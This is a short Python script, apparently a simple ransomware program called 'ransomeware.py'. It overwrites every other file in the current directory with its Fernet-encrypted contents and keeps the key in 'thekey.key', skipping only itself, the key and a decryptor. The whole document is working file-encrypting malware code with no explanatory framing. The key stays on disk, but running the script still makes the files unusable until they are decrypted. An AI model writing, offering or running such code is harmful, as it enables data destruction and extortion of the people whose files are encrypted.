import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "ransomeware.py" or file=="thekey.key" or file =="decrypt.py" :
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

with open("thekey.key", "wb") as key_file:
    key_file.write(key)

for file in files:
    with open(file, "rb") as f:
        contents = f.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as f:
        f.write(contents_encrypted)
